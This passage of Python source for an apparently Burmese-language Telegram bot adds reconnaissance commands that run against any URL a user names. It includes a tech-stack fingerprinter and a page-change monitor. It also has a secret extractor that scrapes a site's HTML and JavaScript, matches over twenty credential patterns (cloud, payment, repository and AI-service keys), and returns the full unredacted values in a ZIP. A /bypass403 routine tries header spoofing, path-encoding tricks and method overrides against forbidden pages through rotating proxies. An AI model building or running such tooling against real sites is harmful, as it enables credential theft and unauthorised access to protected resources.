    "Cloudflare":       [r'cf-ray', r'server:\s*cloudflare'],
    "Akamai":           [r'x-akamai-request-id', r'akamai\.net'],
    "Fastly":           [r'x-fastly-request-id', r'fastly\.net'],
    "AWS CloudFront":   [r'x-amz-cf-id', r'cloudfront\.net'],
    # Analytics / Tag
    "Google Analytics": [r'google-analytics\.com/analytics\.js', r'gtag\('],
    "Google Tag Manager":[r'googletagmanager\.com/gtm\.js', r'GTM-[A-Z0-9]+'],
    "Hotjar":           [r'hotjar\.com', r'hj\(\'create\''],
    # Libraries
    "jQuery":           [r'jquery\.min\.js', r'jquery-[0-9]'],
    "Bootstrap":        [r'bootstrap\.min\.css', r'bootstrap\.min\.js'],
    "Tailwind":         [r'tailwindcss', r'class="[^"]*(?:flex|grid|text-[a-z]+-[0-9])'],
    # Backend
    "PHP":              [r'x-powered-by:\s*php', r'\.php'],
    "Laravel":          [r'laravel_session', r'x-powered-by:\s*php.*laravel'],
    "Django":           [r'csrfmiddlewaretoken', r'django'],
    "Rails":            [r'x-powered-by:\s*phusion passenger', r'_rails_'],
    "ASP.NET":          [r'x-powered-by:\s*asp\.net', r'__viewstate'],
    # DB / Backend hints
    "WordPress (WooCommerce)": [r'woocommerce', r'wc-api/'],
    "Stripe":           [r'stripe\.com/v3', r'Stripe\('],
    "Firebase":         [r'firebaseapp\.com', r'firebase\.initializeApp'],
    "Supabase":         [r'supabase\.co', r'supabaseClient'],
}

_NOTABLE_HEADERS = [
    'server', 'x-powered-by', 'x-generator', 'x-framework',
    'cf-ray', 'via', 'x-drupal-cache', 'x-varnish',
    'x-shopify-stage', 'x-wix-request-id',
]

async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/tech <url> — Detect technology stack"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/tech https://example.com`\n\n"
            "🔬 *Detects:*  CMS, JS frameworks, servers, CDN/WAF,\n"
            "analytics, backend tech, JS libraries & more.\n\n"
            f"Checks `{len(_TECH_SIGNATURES)}` known tech signatures.",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    msg = await update.effective_message.reply_text("🔬 Tech stack fingerprinting...")

    def _do_tech_scan():
        resp = requests.get(
            url, headers=_get_headers(), timeout=TIMEOUT, verify=False,
            proxies=proxy_manager.get_proxy(), allow_redirects=True
        )
        body         = resp.text[:80000]
        headers_str  = "\n".join(f"{k}: {v}" for k, v in resp.headers.items()).lower()
        combined     = (body + headers_str).lower()

        detected = {}
        for tech, patterns in _TECH_SIGNATURES.items():
            for p in patterns:
                if re.search(p, combined, re.I):
                    detected[tech] = p
                    break

        notable = {
            k: v for k, v in resp.headers.items()
            if k.lower() in _NOTABLE_HEADERS
        }
        return detected, notable, resp.status_code

    try:
        detected, notable, status = await asyncio.to_thread(_do_tech_scan)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    lines  = [f"🔬 *Tech Stack — `{domain}`*", f"Status: `{status}`\n"]

    # Group by category
    _CAT = {
        "CMS":        ["WordPress","Drupal","Joomla","Ghost CMS","Shopify","WordPress (WooCommerce)"],
        "JS Frameworks":["Next.js","Nuxt.js","React","Vue.js","Angular","Svelte"],
        "JS Libraries": ["jQuery","Bootstrap","Tailwind"],
        "Server":     ["Nginx","Apache","Caddy","LiteSpeed","IIS"],
        "CDN / WAF":  ["Cloudflare","Akamai","Fastly","AWS CloudFront"],
        "Analytics":  ["Google Analytics","Google Tag Manager","Hotjar"],
        "Backend":    ["PHP","Laravel","Django","Rails","ASP.NET"],
        "Services":   ["Stripe","Firebase","Supabase"],
    }

    any_found = False
    for cat, techs in _CAT.items():
        hits = [t for t in techs if t in detected]
        if hits:
            lines.append(f"*{cat}:*")
            for h in hits:
                lines.append(f"  ✅ `{h}`")
            lines.append("")
            any_found = True

    # Uncategorised
    known_all = {t for ts in _CAT.values() for t in ts}
    extras    = [t for t in detected if t not in known_all]
    if extras:
        lines.append("*Other:*")
        for t in extras:
            lines.append(f"  ✅ `{t}`")
        lines.append("")
        any_found = True

    if not any_found:
        lines.append("⚠️ No known tech signatures matched.")

    if notable:
        lines.append("*📋 Notable Headers:*")
        for k, v in list(notable.items())[:8]:
            lines.append(f"  `{k}: {v[:60]}`")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔔  FEATURE 3 — /monitor  Change Detection & Alerting
# ══════════════════════════════════════════════════
# DB structure: db["monitors"][str(uid)] = [{"url":..,"interval_min":..,"last_hash":..,"last_check":..,"label":..}]

_monitor_app_ref = None   # set in main() to access app.bot

async def monitor_loop():
    """Background task — check monitored URLs for content changes every 60s."""
    global _monitor_app_ref
    while True:
        try:
            await asyncio.sleep(60)
            async with db_lock:
                db = _load_db_sync()

            changed_alerts = []  # (uid, entry, new_hash)
            now = time.time()

            for uid_str, monitors in db.get("monitors", {}).items():
                for entry in monitors:
                    interval_sec = entry.get("interval_min", 30) * 60
                    if now - entry.get("last_check", 0) < interval_sec:
                        continue
                    try:
                        resp      = requests.get(
                            entry["url"], headers=_get_headers(),
                            timeout=TIMEOUT, verify=False,
                            proxies=proxy_manager.get_proxy()
                        )
                        new_hash  = hashlib.sha256(resp.text.encode()).hexdigest()
                        old_hash  = entry.get("last_hash", "")
                        entry["last_check"] = now

                        if old_hash and old_hash != new_hash:
                            changed_alerts.append((uid_str, entry, new_hash, resp.status_code))
                        entry["last_hash"] = new_hash
                    except Exception as ex:
                        logger.debug("Monitor check error %s: %s", entry.get("url"), ex)

            async with db_lock:
                _save_db_sync(db)

            # Fire alerts
            if _monitor_app_ref and changed_alerts:
                for uid_str, entry, new_hash, status in changed_alerts:
                    try:
                        label = entry.get("label") or entry["url"][:40]
                        await _monitor_app_ref.bot.send_message(
                            chat_id=int(uid_str),
                            text=(
                                f"🔔 *Page Changed!*\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🏷 *{label}*\n"
                                f"🔗 `{entry['url'][:60]}`\n"
                                f"📡 Status: `{status}`\n"
                                f"🕑 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                                f"Old: `{entry.get('last_hash','?')[:16]}…`\n"
                                f"New: `{new_hash[:16]}…`\n\n"
                                f"_Use /monitor list to manage alerts_"
                            ),
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.warning("Monitor alert send error: %s", e)

        except Exception as e:
            logger.error("Monitor loop error: %s", e)
            await asyncio.sleep(30)


async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/monitor add <url> [interval_min] [label] | list | del <n> | clear"""
    uid  = str(update.effective_user.id)
    args = context.args or []
    sub  = args[0].lower() if args else ""

    if not sub or sub == "help":
        await update.effective_message.reply_text(
            "🔔 *Page Monitor — Usage*\n\n"
            "`/monitor add <url> [interval] [label]`\n"
            "  └ interval = minutes (default 30, min 5)\n"
            "  └ label = custom name (optional)\n\n"
            "`/monitor list` — View all monitors\n"
            "`/monitor del <n>` — Remove by number\n"
            "`/monitor clear` — Remove all\n\n"
            "📣 Bot ကို alert ပို့ပေးမယ် page ပြောင်းတိုင်း",
            parse_mode='Markdown'
        )
        return

    async with db_lock:
        db = _load_db_sync()
        if "monitors" not in db:
            db["monitors"] = {}
        monitors = db["monitors"].setdefault(uid, [])

        if sub == "add":
            if len(args) < 2:
                await update.effective_message.reply_text("Usage: `/monitor add <url> [interval_min] [label]`", parse_mode='Markdown')
                _save_db_sync(db)
                return
            url   = args[1].strip()
            if not url.startswith('http'):
                url = 'https://' + url
            safe_ok, reason = is_safe_url(url)
            if not safe_ok:
                await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
                _save_db_sync(db)
                return
            interval = max(5, int(args[2])) if len(args) > 2 and args[2].isdigit() else 30
            label    = " ".join(args[3:])[:40] if len(args) > 3 else urlparse(url).hostname
            if len(monitors) >= 10:
                await update.effective_message.reply_text("⚠️ Max 10 monitors per user.", parse_mode='Markdown')
                _save_db_sync(db)
                return
            monitors.append({
                "url": url, "label": label,
                "interval_min": interval,
                "last_hash": "", "last_check": 0,
                "added": datetime.now().strftime("%Y-%m-%d %H:%M")
            })
            _save_db_sync(db)
            await update.effective_message.reply_text(
                f"✅ *Monitor Added*\n"
                f"🏷 `{label}`\n🔗 `{url[:60]}`\n⏱ Every `{interval}` min",
                parse_mode='Markdown'
            )

        elif sub == "list":
            _save_db_sync(db)
            if not monitors:
                await update.effective_message.reply_text("📭 No monitors set up yet.")
                return
            lines = ["🔔 *Your Monitors*\n"]
            for i, m in enumerate(monitors, 1):
                lines.append(
                    f"*{i}.* `{m.get('label', m['url'][:30])}`\n"
                    f"   🔗 `{m['url'][:50]}`\n"
                    f"   ⏱ Every `{m['interval_min']}` min | Added `{m.get('added','?')}`"
                )
            await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')

        elif sub == "del":
            idx = int(args[1]) - 1 if len(args) > 1 and args[1].isdigit() else -1
            if 0 <= idx < len(monitors):
                removed = monitors.pop(idx)
                _save_db_sync(db)
                await update.effective_message.reply_text(
                    f"🗑 Removed: `{removed.get('label', removed['url'][:40])}`",
                    parse_mode='Markdown'
                )
            else:
                _save_db_sync(db)
                await update.effective_message.reply_text("❌ Invalid number. Use `/monitor list` to see indexes.", parse_mode='Markdown')

        elif sub == "clear":
            monitors.clear()
            _save_db_sync(db)
            await update.effective_message.reply_text("🗑 All monitors cleared.")

        else:
            _save_db_sync(db)
            await update.effective_message.reply_text("❓ Unknown subcommand. Use `/monitor help`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔑  FEATURE 7 — /extract  Secret & Sensitive Data Extractor
# ══════════════════════════════════════════════════

_SECRET_PATTERNS = {
    "AWS Access Key":    (r'AKIA[0-9A-Z]{16}',                              "🔴"),
    "AWS Secret":        (r'(?i)aws.{0,20}secret.{0,20}[0-9a-zA-Z/+]{40}', "🔴"),
    "Stripe Secret":     (r'sk_live_[0-9a-zA-Z]{24,}',                     "🔴"),
    "Stripe Public":     (r'pk_live_[0-9a-zA-Z]{24,}',                     "🟡"),
    "JWT Token":         (r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', "🔴"),
    "Google API Key":    (r'AIza[0-9A-Za-z_-]{35}',                        "🔴"),
    "Firebase Config":   (r'"apiKey"\s*:\s*"AIza[0-9A-Za-z_-]{35}"',       "🔴"),
    "Private Key Block": (r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',      "🔴"),
    "GitHub Token":      (r'ghp_[0-9a-zA-Z]{36}',                          "🔴"),
    "GitLab Token":      (r'glpat-[0-9a-zA-Z_-]{20}',                      "🔴"),
    "Slack Token":       (r'xox[baprs]-[0-9a-zA-Z\-]+',                    "🔴"),
    "Bearer Token":      (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}',           "🟠"),
    "Basic Auth Header": (r'(?i)authorization:\s*basic\s+[A-Za-z0-9+/=]{8,}',"🟠"),
    "MongoDB URI":       (r'mongodb(?:\+srv)?://[^\s"\'<>]{10,}',           "🔴"),
    "MySQL DSN":         (r'mysql://[^\s"\'<>]{10,}',                       "🔴"),
    "Generic Password":  (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{8,}["\']', "🟠"),
    "Telegram Token":    (r'\d{8,10}:AA[0-9a-zA-Z_-]{33}',                 "🔴"),
    "Sendgrid Key":      (r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',    "🔴"),
    "Twilio Key":        (r'SK[0-9a-fA-F]{32}',                             "🟠"),
    "HuggingFace Token": (r'hf_[a-zA-Z]{34}',                              "🟡"),
    "OpenAI Key":        (r'sk-[a-zA-Z0-9]{48}',                           "🔴"),
}

async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/extract <url> — Scan HTML + JS for secrets, always exports ZIP with all sources"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/extract https://example.com`\n\n"
            "🔑 Scans HTML source + all external/inline JS files for:\n"
            "AWS keys, Stripe, JWT, GitHub tokens, Firebase configs,\n"
            "private keys, MongoDB URIs, passwords & more.\n\n"
            f"Checks `{len(_SECRET_PATTERNS)}` secret patterns across all JS bundles.\n\n"
            "📦 *Always exports a ZIP* containing:\n"
            "  • `index.html` — raw HTML source\n"
            "  • `js/` folder — all external JS files\n"
            "  • `inline_scripts/` — all inline `<script>` blocks\n"
            "  • `report.json` — full findings report\n"
            "  • `report.txt` — human-readable summary\n\n"
            "⚠️ _For authorized security research only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname

    msg = await update.effective_message.reply_text(
        f"🔑 Scanning `{domain}`...\n\n"
        "⬇️ Phase 1: Fetching HTML source\n"
        "📦 Phase 2: Downloading JS bundles\n"
        "🔍 Phase 3: Pattern matching\n"
        "🗜️ Phase 4: Building ZIP\n\n⏳",
        parse_mode='Markdown'
    )

    def _do_extract():
        session   = requests.Session()
        session.headers.update(_get_headers())

        resp = session.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
        soup = BeautifulSoup(resp.text, 'html.parser')

        # ── Build source map ──────────────────────────────
        # sources = { filename_in_zip : content_str }
        sources        = {}
        source_origins = {}   # filename → original URL or tag info
        inline_idx     = 0
        js_idx         = 0

        # 1. Main HTML
        sources["index.html"]        = resp.text
        source_origins["index.html"] = url

        # 2. External JS + inline scripts
        for script in soup.find_all('script'):
            src = script.get('src')
            if src:
                js_url    = urljoin(url, src) if not src.startswith('http') else src
                js_safe, _ = is_safe_url(js_url)
                if not js_safe:
                    continue
                try:
                    jr = session.get(js_url, timeout=12, verify=False)
                    if jr.status_code == 200 and jr.text.strip():
                        # Make a safe filename from the URL path
                        raw_name = src.split('/')[-1].split('?')[0][:60] or f"script_{js_idx}.js"
                        # Ensure .js extension
                        if not raw_name.endswith('.js'):
                            raw_name += '.js'
                        safe_name = re.sub(r'[^\w\.\-]', '_', raw_name)
                        fname     = f"js/{js_idx:03d}_{safe_name}"
                        sources[fname]        = jr.text
                        source_origins[fname] = js_url
                        js_idx += 1
                except Exception:
                    pass
            elif script.string and script.string.strip():
                content_str = script.string.strip()
                fname       = f"inline_scripts/inline_{inline_idx:03d}.js"
                sources[fname]        = content_str[:200000]   # cap at 200KB per inline
                source_origins[fname] = f"<script> tag #{inline_idx} on {url}"
                inline_idx += 1

        # ── Scan all sources ──────────────────────────────
        findings  = []
        seen_keys = set()

        for fname, content in sources.items():
            file_findings = []
            for stype, (pattern, risk) in _SECRET_PATTERNS.items():
                for match in re.finditer(pattern, content):
                    val = match.group(0)
                    # Store FULL value in findings (goes into ZIP report, not Telegram message)
                    dedup_key = stype + val[:40]
                    if dedup_key in seen_keys:
                        continue
                    seen_keys.add(dedup_key)
                    # Redacted copy for Telegram display
                    if len(val) > 16:
                        redacted = val[:8] + "…" + val[-4:]
                    else:
                        redacted = val[:6] + "…"
                    file_findings.append({
                        "type":     stype,
                        "risk":     risk,
                        "value_redacted": redacted,
                        "value_full":     val,       # full value stored in ZIP only
                        "file":     fname,
                        "origin":   source_origins.get(fname, ""),
                        "line":     content[:match.start()].count('\n') + 1,
                    })
            findings.extend(file_findings)

        return sources, source_origins, findings

    try:
        sources, source_origins, findings = await asyncio.to_thread(_do_extract)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{type(e).__name__}: {str(e)[:80]}`", parse_mode='Markdown')
        return

    # ── Sort findings by risk ────────────────────────────
    risk_order = {"🔴": 0, "🟠": 1, "🟡": 2}
    findings.sort(key=lambda x: risk_order.get(x["risk"], 9))

    critical = sum(1 for f in findings if f["risk"] == "🔴")
    high     = sum(1 for f in findings if f["risk"] == "🟠")
    med      = sum(1 for f in findings if f["risk"] == "🟡")

    # ── Build report.txt (human readable, full values) ──
    txt_lines = [
        f"=" * 60,
        f"  EXTRACT REPORT — {domain}",
        f"  Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M')}",
        f"  URL: {url}",
        f"=" * 60,
        f"",
        f"SUMMARY",
        f"-------",
        f"Sources scanned : {len(sources)} files",
        f"Patterns checked: {len(_SECRET_PATTERNS)}",
        f"Findings total  : {len(findings)}",
        f"  Critical (🔴) : {critical}",
        f"  High     (🟠) : {high}",
        f"  Medium   (🟡) : {med}",
        f"",
        f"FILES SCANNED",
        f"-------------",
    ]
    for fname, origin in source_origins.items():
        size_kb = len(sources[fname].encode('utf-8', errors='replace')) / 1024
        txt_lines.append(f"  [{size_kb:6.1f} KB]  {fname}  ←  {origin[:80]}")

    txt_lines += ["", "FINDINGS", "--------"]
    if findings:
        for i, f in enumerate(findings, 1):
            txt_lines += [
                f"",
                f"[{i:03d}] {f['risk']} {f['type']}",
                f"  File  : {f['file']}",
                f"  Line  : {f['line']}",
                f"  Origin: {f['origin'][:80]}",
                f"  Value : {f['value_full']}",    # ← FULL value in ZIP file
            ]
    else:
        txt_lines.append("  No secrets found.")

    txt_lines += [
        "",
        "=" * 60,
        "  ⚠  This report contains unredacted values.",
        "  For authorized security research only.",
        "=" * 60,
    ]
    report_txt = "\n".join(txt_lines)

    # ── Build report.json ────────────────────────────────
    report_json = json.dumps({
        "domain":          domain,
        "url":             url,
        "scanned_at":      datetime.now().isoformat(),
        "files_scanned":   list(source_origins.values()),
        "pattern_count":   len(_SECRET_PATTERNS),
        "findings_count":  len(findings),
        "summary":         {"critical": critical, "high": high, "medium": med},
        "findings": [{
            "type":   f["type"],
            "risk":   f["risk"],
            "value":  f["value_full"],
            "file":   f["file"],
            "line":   f["line"],
            "origin": f["origin"],
        } for f in findings],
        "files": {fname: source_origins[fname] for fname in sources},
    }, ensure_ascii=False, indent=2)

    # ── Build ZIP in memory ──────────────────────────────
    await msg.edit_text(
        f"🗜️ Building ZIP for `{domain}`...\n"
        f"📂 `{len(sources)}` source files + reports",
        parse_mode='Markdown'
    )

    import io
    zip_buffer = io.BytesIO()
    safe_domain = re.sub(r'[^\w\-]', '_', domain)
    ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_name    = f"extract_{safe_domain}_{ts}.zip"

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Source files
        for fname, content in sources.items():
            zf.writestr(f"sources/{fname}", content.encode('utf-8', errors='replace'))
        # Reports
        zf.writestr("report.txt",  report_txt.encode('utf-8'))
        zf.writestr("report.json", report_json.encode('utf-8'))
        # README
        _js_count     = sum(1 for f in sources if f.startswith("js/"))
        _inline_count = sum(1 for f in sources if f.startswith("inline_scripts/"))
        readme = (
            f"EXTRACT SCAN — {domain}\n"
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"CONTENTS\n"
            f"  sources/index.html           — Raw HTML page\n"
            f"  sources/js/                  — External JS files ({_js_count} files)\n"
            f"  sources/inline_scripts/      — Inline <script> blocks ({_inline_count} blocks)\n"
            f"  report.txt                   — Human-readable findings (FULL values)\n"
            f"  report.json                  — Machine-readable JSON report\n\n"
            f"FINDINGS: {len(findings)} total  "
            f"(Critical:{critical} High:{high} Medium:{med})\n"
        )
        zf.writestr("README.txt", readme.encode('utf-8'))

    zip_buffer.seek(0)
    zip_size_mb = zip_buffer.getbuffer().nbytes / 1024 / 1024

    # ── Send Telegram summary (redacted) ────────────────
    if findings:
        tg_lines = [
            f"🚨 *{len(findings)} Secret(s) Found — `{domain}`*",
            f"🔴 Critical: `{critical}` | 🟠 High: `{high}` | 🟡 Medium: `{med}`",
            f"📂 Scanned: `{len(sources)}` files\n",
        ]
        for f in findings[:15]:
            tg_lines.append(
                f"{f['risk']} *{f['type']}*\n"
                f"   Value: `{f['value_redacted']}`\n"
                f"   File:  `{f['file']}`  Line `{f['line']}`"
            )
        if len(findings) > 15:
            tg_lines.append(f"\n_…and {len(findings)-15} more — see ZIP report_")
        tg_lines.append("\n⚠️ _Telegram: values redacted. Full values in ZIP report._")
    else:
        tg_lines = [
            f"✅ *No Secrets Found*",
            f"🔗 `{domain}`",
            f"📂 Sources scanned: `{len(sources)}` files",
            f"🔍 Patterns checked: `{len(_SECRET_PATTERNS)}`",
            f"\n_ZIP contains all raw source files for manual review._",
        ]

    tg_text = "\n".join(tg_lines)
    try:
        if len(tg_text) > 4000:
            await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
        else:
            await msg.edit_text(tg_text, parse_mode='Markdown')
    except Exception:
        pass

    # ── Send ZIP ─────────────────────────────────────────
    cap = (
        f"📦 *Extract ZIP — `{domain}`*\n"
        f"🔍 `{len(sources)}` source files | `{len(findings)}` findings\n"
        f"🔴`{critical}` 🟠`{high}` 🟡`{med}` | 💾 `{zip_size_mb:.2f} MB`\n\n"
        f"📄 `report.txt` — full unredacted values\n"
        f"📋 `report.json` — machine-readable\n"
        f"📁 `sources/` — raw HTML + JS files"
    )
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=zip_buffer,
            filename=zip_name,
            caption=cap,
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ ZIP send error: `{type(e).__name__}: {str(e)[:60]}`",
            parse_mode='Markdown'
        )



# ══════════════════════════════════════════════════
# 🔓  /bypass403 — 403 Forbidden Bypass Tester
# ══════════════════════════════════════════════════

_BYPASS_HEADERS = [
    {"X-Original-URL":             "{path}"},
    {"X-Rewrite-URL":              "{path}"},
    {"X-Custom-IP-Authorization":  "127.0.0.1"},
    {"X-Forwarded-For":            "127.0.0.1"},
    {"X-Forwarded-For":            "localhost"},
    {"X-Remote-IP":                "127.0.0.1"},
    {"X-Remote-Addr":              "127.0.0.1"},
    {"X-Host":                     "localhost"},
    {"X-Real-IP":                  "127.0.0.1"},
    {"X-ProxyUser-Ip":             "127.0.0.1"},
    {"Referer":                    "{url}"},
    {"X-Originating-IP":           "127.0.0.1"},
    {"True-Client-IP":             "127.0.0.1"},
    {"Client-IP":                  "127.0.0.1"},
    {"CF-Connecting-IP":           "127.0.0.1"},
    {"Forwarded":                  "for=127.0.0.1"},
    {"X-Frame-Options":            "Allow"},
    {"X-WAF-Bypass":               "1"},
    {"X-Bypass":                   "1"},
    {"Authorization":              "Bearer null"},
]

_BYPASS_PATH_VARIANTS = [
    "{path}",
    "{path}/",
    "{path}//",
    "{path}/.",
    "{path}/..",
    "/{path_no_slash}%20",
    "/{path_no_slash}%09",
    "/{path_no_slash}%00",
    "/{path_no_slash}..;/",
    "/{path_no_slash};/",
    "/{path_no_slash}?",
    "//{path_no_slash}",
    "/{path_upper}",
    "/{path_lower}",
    "{path_dot_slash}",
]

_BYPASS_METHODS = ["POST", "PUT", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]

def _bypass_sync(url: str) -> list:
    """Run all 403 bypass techniques against a URL."""
    parsed     = urlparse(url)
    path       = parsed.path or "/"
    path_clean = path.lstrip("/")
    base       = f"{parsed.scheme}://{parsed.netloc}"
    results    = []


    def _probe(test_url: str, extra_headers: dict = None, method: str = "GET",
               label: str = "") -> dict | None:
        try:
            h = dict(_get_headers())
            if extra_headers:
                # Resolve {path} / {url} placeholders in header values
                for k, v in extra_headers.items():
                    v = v.replace("{path}", path).replace("{url}", url)
                    h[k] = v
            r = requests.request(
                method, test_url, headers=h,
                timeout=8, verify=False,
                allow_redirects=False,
                proxies=proxy_manager.get_proxy()
            )
            return {
                "url":    test_url,
                "method": method,
                "status": r.status_code,
                "size":   len(r.content),
                "label":  label,
                "headers": dict(r.headers),
            }
        except Exception:
            return None

    # ── Baseline: confirm it's actually 403 ────────
    baseline = _probe(url, label="baseline")
    if not baseline:
        return []
    results.append({**baseline, "technique": "Baseline"})
    baseline_status = baseline["status"]
    baseline_size   = baseline["size"]

    def _is_bypass(r: dict) -> bool:
        if not r:
            return False
        st = r["status"]
        # Success: 200/201/204/301/302 when baseline was 403/401
        if baseline_status in (403, 401):
            if st in (200, 201, 204, 301, 302):
                return True
            # Different size even on 403 might indicate WAF bypass
            if st == baseline_status and abs(r["size"] - baseline_size) > 500:
                return True
        return False

    # ── Header manipulation ──────────────────────────
    for hdr_template in _BYPASS_HEADERS:
        hdrs = {}
        for k, v in hdr_template.items():
            hdrs[k] = v.replace("{path}", path).replace("{url}", url)
        label = "Header: " + ", ".join(f"{k}: {v}" for k, v in hdr_template.items())
        r = _probe(url, hdrs, label=label)
        if r:
            r["technique"] = "header_manipulation"
            results.append(r)

    # ── Path variants ────────────────────────────────
    path_variants = [
        (f"{base}{path}/",                    "path/"),
        (f"{base}{path}//",                   "path//"),
        (f"{base}{path}/.",                   "path/."),
        (f"{base}/{path_clean}%20",           "url_encode_space"),
        (f"{base}/{path_clean}%09",           "url_encode_tab"),
        (f"{base}/{path_clean}%00",           "null_byte"),
        (f"{base}/{path_clean}..;/",          "path_dotdot"),
        (f"{base}/{path_clean};/",            "semicolon"),
        (f"{base}//{path_clean}",             "double_slash"),
        (f"{base}/{path_clean.upper()}",      "uppercase"),
        (f"{base}/{path_clean.lower()}",      "lowercase"),
        (f"{base}/{path_clean}?anything",     "query_append"),
        (f"{base}/{path_clean}#",             "fragment"),
        (f"{base}/./{ path_clean}",           "dot_prefix"),
        (f"{base}/{path_clean}/..",           "dotdot_suffix"),
    ]
    for test_url, label in path_variants:
        safe_ok, _ = is_safe_url(test_url)
        if not safe_ok:
            continue
        r = _probe(test_url, label=label)
        if r:
            r["technique"] = "path_variant"
            results.append(r)

    # ── HTTP method override ─────────────────────────
    for method in _BYPASS_METHODS:
        r = _probe(url, method=method, label=f"Method: {method}")
        if r:
            r["technique"] = "method_override"
            results.append(r)

    # ── Method override via header ───────────────────
    for method in ["GET", "POST", "PUT", "DELETE"]:
        r = _probe(url,
                   extra_headers={"X-HTTP-Method-Override": method,
                                  "X-Method-Override": method},
                   label=f"X-HTTP-Method-Override: {method}")
        if r:
            r["technique"] = "method_override_header"
            results.append(r)

    # ── Content-Type tricks ──────────────────────────
    for ct in ["application/json", "text/xml", "application/x-www-form-urlencoded"]:
        r = _probe(url, extra_headers={"Content-Type": ct, "Content-Length": "0"},
                   method="POST", label=f"POST Content-Type: {ct}")
        if r:
            r["technique"] = "content_type"
            results.append(r)

    # Tag bypasses
    for res in results:
        res["bypassed"] = _is_bypass(res)

    return results


async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/bypass403 <url> — Test 403 Forbidden bypass techniques"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/bypass403 https://example.com/admin`\n\n"
            "🔓 *Tests 50+ bypass techniques:*\n"
            "  • Header manipulation (X-Original-URL, X-Forwarded-For...)\n"
            "  • Path normalization variants (/admin/, /ADMIN, /admin/..)\n"
            "  • HTTP method override (POST, PUT, OPTIONS...)\n"
            "  • X-HTTP-Method-Override header\n"
            "  • Content-Type tricks\n"
            "  • URL encoding bypass (%20, %09, %00)\n\n"
            "⚠️ _For authorized security testing only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    path   = urlparse(url).path or "/"

    msg = await update.effective_message.reply_text(
        f"🔓 *Bypass Testing — `{domain}`*\n"
        f"Path: `{path}`\n\n"
        "Running 50+ bypass techniques...\n⏳",
        parse_mode='Markdown'
    )

    try:
        results = await asyncio.to_thread(_bypass_sync, url)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    baseline    = next((r for r in results if r.get("technique") == "Baseline"), None)
    baseline_st = baseline["status"] if baseline else "?"
    bypasses    = [r for r in results if r.get("bypassed")]
    tested      = len(results) - 1   # exclude baseline

    lines = [
        f"🔓 *Bypass Results — `{path}`*",
        f"🌐 `{domain}` | Baseline: `{baseline_st}`",
        f"🧪 Tested: `{tested}` techniques | ✅ Bypassed: `{len(bypasses)}`\n",
    ]

    if not bypasses:
        lines.append("🔒 No bypasses found — endpoint is well-protected.")
    else:
        lines.append(f"*🚨 {len(bypasses)} Bypass(es) Found:*")
        for b in bypasses[:15]:
            st_icon = "✅" if b["status"] in (200,201,204) else "↪️"
            lines.append(
                f"  {st_icon} `{b['status']}` [{b['method']}] `{b['label'][:55]}`"
            )
            if b["status"] in (301, 302):
                loc = b.get("headers", {}).get("Location", "")
                if loc:
                    lines.append(f"      → `{loc[:60]}`")

    # ── Summary by technique type ────────────────────
    tech_counts = {}
    for b in bypasses:
        t = b.get("technique", "other")
        tech_counts[t] = tech_counts.get(t, 0) + 1
    if tech_counts:
        lines.append("\n*By technique:*")
        for t, c in sorted(tech_counts.items(), key=lambda x: -x[1]):
